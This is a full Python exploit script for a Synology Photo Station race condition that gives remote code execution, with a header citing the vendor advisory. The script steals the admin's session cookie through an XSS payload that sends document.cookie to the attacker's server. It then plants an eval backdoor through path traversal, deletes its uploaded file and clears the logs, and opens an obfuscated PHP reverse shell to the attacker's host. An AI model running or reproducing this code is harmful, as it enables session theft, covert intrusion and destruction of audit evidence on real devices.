#!/usr/local/bin/python
"""
Synology Photo Station <= 6.8.2-3461 (latest) SYNOPHOTO_Flickr_MultiUpload Race Condition File Write Remote Code Execution Vulnerability
Found by: mr_me
Tested: 6.8.2-3461 (latest at the time)
Vendor Advisory: https://www.synology.com/en-global/support/security/Synology_SA_18_02

# Summary:
==========

This vulnerability allows remote attackers to execute arbitrary code on vulnerable installations of Synology Photo Station. Although authentication is required to exploit this vulnerability, the existing authentication mechanism can be bypassed.
The specific flaw exists within the SYNOPHOTO_Flickr_MultiUpload function. When parsing the prog_id parameter, the process does not properly validate a user-supplied string before using it to execute a call to file_put_contents. An attacker can leverage this vulnerability to execute code under the context of the PhotoStation user.

# Example:
==========

saturn:synology mr_me$ ./sinology.py 192.168.100.9 en0

    Synology Photo Station SYNOPHOTO_Flickr_MultiUpload Race Condition File Write Remote Code Execution Vulnerability
    mr_me

(+) waiting for the admin...
(+) stolen: qt4obchbqfss2ap9ct9nb1i534
(+) updated the settings!
(+) wrote php code!
(+) attempting race condition...
(+) won the race!
(+) rce is proven!
(+) deleted the image and scrubbed the logs!
(+) starting handler on port 4444
(+) connection from 192.168.100.9
(+) pop thy shell!
id
uid=138862(PhotoStation) gid=138862(PhotoStation) groups=138862(PhotoStation)
"""

import sys
import socket
import requests
import telnetlib
from threading import Thread
from base64 import b64encode as b64e
from BaseHTTPServer import HTTPServer, BaseHTTPRequestHandler

try:
    import netifaces as ni
except:
    print "(-) try 'pip install netifaces'"
    sys.exit(1)

# haven't pwned yet
pwned = False

class xss(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        return
    def do_GET(self):
        global s

        # incase the referer isn't set, its coming from someone else
        try:
            referer = self.headers.get('Referer')
        except:
            referer = ""

        # of course this isn't bullet proof, but its enough for a poc
        if t in referer:
            if "PHPSESSID" in self.path:
                s = self.path.split("=")[1]
                print "(+) stolen: %s" % s
                pwned = True
                self.send_response(200)
                self.end_headers()
        return

def _build_bd(raw=False):
    php = "<?php file_put_contents('si.php','<?php eval(base64_decode($_SERVER[HTTP_SIN]));');die('done'); ?>.gif"
    if raw == True:
        return php
    return "photo_2f_%s" % (php.encode("hex"))

def we_can_set_settings(target, session):
    uri = "http://%s/photo/admin/share_setting.php" % target
    d = {
        "action" : "set_setting",
        "social_flickr" : "on",
        "share_upload_orig" : "on"
    }
    c = { "PHPSESSID" : session }
    r = requests.post(uri, data=d, cookies=c).json()
    if "success" in r:
        if r["success"] == True:
            return True
    return False

def we_can_upload(target, session):
    uri = "http://%s/photo/webapi/file.php" % (target)
    p = { "SynoToken" : session }
    c = { "PHPSESSID" : session }

    # valid gif, important
    gif  = "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x00"
    gif += "\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c"
    gif += "\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02"
    f = { "original": ("si.gif", gif) }
    d = {
        "api": "SYNO.PhotoStation.File", 
        "method" : "uploadphoto",
        "version" : 1,
        "dest_folder_path": "",
        "duplicate" : "rename",
        "mtime": "1513540164787",
        "filename" : _build_bd(True)
    }
    r = requests.post(uri, params=p, files=f, cookies=c, data=d).json()
    if "success" in r:
        if r["success"] == True:
            return True
    return False

def race(target):
    r = ""
    while("done" not in r):
        r = requests.get("http://%s/photo/pwn.php" % target).text
    return True 

def we_won_race(target, session, racing_thread):
    while(racing_thread.isAlive()):
        uri = "http://%s/photo/SocialNetwork/flickr.php" % target
        d = {
            "prog_id" : "../../volume1/@appstore/PhotoStation/photo/pwn.php",
            "action" : "multi_upload",
            "token" : 1,
            "secret" : "",
            "photoList" : _build_bd()
        }
        c = { "PHPSESSID": session }
        requests.post(uri, cookies=c, data=d)
    return True

def build_php_code():
    phpkode  = ("""
    @set_time_limit(0); @ignore_user_abort(1); @ini_set('max_execution_time',0);""")
    phpkode += ("""$dis=@ini_get('disable_functions');""")
    phpkode += ("""if(!empty($dis)){$dis=preg_replace('/[, ]+/', ',', $dis);$dis=explode(',', $dis);""")
    phpkode += ("""$dis=array_map('trim', $dis);}else{$dis=array();} """)
    phpkode += ("""if(!function_exists('LcNIcoB')){function LcNIcoB($c){ """)
    phpkode += ("""global $dis;if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {$c=$c." 2>&1\\n";} """)
    phpkode += ("""$imARhD='is_callable';$kqqI='in_array';""")
    phpkode += ("""if($imARhD('popen')and!$kqqI('popen',$dis)){$fp=popen($c,'r');""")
    phpkode += ("""$o=NULL;if(is_resource($fp)){while(!feof($fp)){ """)
    phpkode += ("""$o.=fread($fp,1024);}}@pclose($fp);}else""")
    phpkode += ("""if($imARhD('proc_open')and!$kqqI('proc_open',$dis)){ """)
    phpkode += ("""$handle=proc_open($c,array(array(pipe,'r'),array(pipe,'w'),array(pipe,'w')),$pipes); """)
    phpkode += ("""$o=NULL;while(!feof($pipes[1])){$o.=fread($pipes[1],1024);} """)
    phpkode += ("""@proc_close($handle);}else if($imARhD('system')and!$kqqI('system',$dis)){ """)
    phpkode += ("""ob_start();system($c);$o=ob_get_contents();ob_end_clean(); """)
    phpkode += ("""}else if($imARhD('passthru')and!$kqqI('passthru',$dis)){ob_start();passthru($c); """)
    phpkode += ("""$o=ob_get_contents();ob_end_clean(); """)
    phpkode += ("""}else if($imARhD('shell_exec')and!$kqqI('shell_exec',$dis)){ """)
    phpkode += ("""$o=shell_exec($c);}else if($imARhD('exec')and!$kqqI('exec',$dis)){ """)
    phpkode += ("""$o=array();exec($c,$o);$o=join(chr(10),$o).chr(10);}else{$o=0;}return $o;}} """)
    phpkode += ("""$nofuncs='no exec functions'; """)
    phpkode += ("""if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){ """)
    phpkode += ("""$s=@fsockopen('tcp://%s','%d');while($c=fread($s,2048)){$out = ''; """ % (cb_host, cb_port))
    phpkode += ("""if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
    phpkode += ("""}elseif (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit'){break;}else{ """)
    phpkode += ("""$out=LcNIcoB(substr($c,0,-1));if($out===false){fwrite($s,$nofuncs); """)
    phpkode += ("""break;}}fwrite($s,$out);}fclose($s);}else{ """)
    phpkode += ("""$s=@socket_create(AF_INET,SOCK_STREAM,SOL_TCP);@socket_connect($s,'%s','%d'); """ % (cb_host, cb_port))
    phpkode += ("""@socket_write($s,"socket_create");while($c=@socket_read($s,2048)){ """)
    phpkode += ("""$out = '';if(substr($c,0,3) == 'cd '){chdir(substr($c,3,-1)); """)
    phpkode += ("""} else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') { """)
    phpkode += ("""break;}else{$out=LcNIcoB(substr($c,0,-1));if($out===false){ """)
    phpkode += ("""@socket_write($s,$nofuncs);break;}}@socket_write($s,$out,strlen($out)); """)
    phpkode += ("""}@socket_close($s);} """)
    return phpkode

def exec_code(target):
    handlerthr = Thread(target=handler, args=(cb_port,))
    handlerthr.start()
    we_can_exec_php(target, b64e(build_php_code()))
 
def handler(lport):
    print "(+) starting handler on port %d" % lport
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lport))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" % addr[0]
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()

def we_can_exec_php(target, php):
    h = { "SIN" : php }
    r = requests.get("http://%s/photo/si.php" % target, headers=h)
    if r.text == "pwn":
        return True
    return False

def we_can_clean_up(target, session):
    uri = "http://%s/photo/webapi/photo.php" % target

    d = {
        "api": "SYNO.PhotoStation.Photo", 
        "method" : "delete",
        "version" : 1,
        "id" : _build_bd()
    }
    c = { "PHPSESSID" : session }
    h = { "X-SYNO-TOKEN" : session }
    r = requests.post(uri, cookies=c, data=d, headers=h).json()
    if "success" in r:
        if r["success"] == True:
            return True
    return False

def banner():
    return """\n\tSynology Photo Station SYNOPHOTO_Flickr_MultiUpload Race Condition File Write Remote Code Execution Vulnerability\n\tmr_me\n"""

def do_xss(target, ip):
    j = "\"><img src=x onerror=this.src=\"http://%s:9090/?\"+document.cookie>" % ip
    d = {
        "api" : "SYNO.PhotoStation.Auth",
        "method" : "login",
        "version" : 1,
        "username" : j,
        "password" : "WAT",
        "enable_syno_token" : "true"
    }
    r = requests.post("http://%s/photo/webapi/auth.php" % target, data=d).json()

def we_can_clear_logs(target, session):
    c = { "PHPSESSID" : session }
    p = { "SynoToken" : session }
    d = {
        "api": "SYNO.PhotoStation.PhotoLog", 
        "method" : "clear",
        "version" : 1,
    }
    r = requests.post("http://%s/photo/webapi/log.php" % target, data=d, params=p, cookies=c).json()
    if "success" in r:
        if r["success"] == True:
            return True
    return False

def start_pain_train(t, s):
    if we_can_set_settings(t, s):
        print "(+) updated the settings!"
        if we_can_upload(t, s):
            print "(+) wrote php code!"
            print "(+) attempting race condition..."
            r = Thread(target=race, args=(t,))
            r.start()
            if we_won_race(t, s, r):
                print "(+) won the race!"
                if we_can_exec_php(t, b64e('`rm pwn.php`;echo "pwn";')):
                    print "(+) rce is proven!"
                    if we_can_clean_up(t, s) and we_can_clear_logs(t, s):
                        print "(+) deleted the image and scrubbed the logs!"
                        exec_code(t)

def keep_running():
    if pwned == True:
        return False
    return True

def main():
    print banner()
    global cb_host, cb_port, s, t
    if len(sys.argv) != 3:
        print "(+) usage: %s <target> <interface>" % sys.argv[0]
        print "(+) eg: %s 192.168.100.9 en0" % sys.argv[0]
        sys.exit(1)

    s       = ""
    t       = sys.argv[1]
    cb_port = 4444

    try:
        cb_host = ni.ifaddresses(sys.argv[2])[2][0]['addr']
    except:
        print "(-) no ip address associated with that interface!"
        sys.exit(1)

    do_xss(t, cb_host)

    try:
        server = HTTPServer(('0.0.0.0', 9090), xss)
        print '(+) waiting for the admin...'
        while keep_running():
            server.handle_request()

    except KeyboardInterrupt:
        print '(+) shutting down the web server'
        server.socket.close()

    if s != "":
        start_pain_train(t, s)

if __name__ == "__main__":
    main()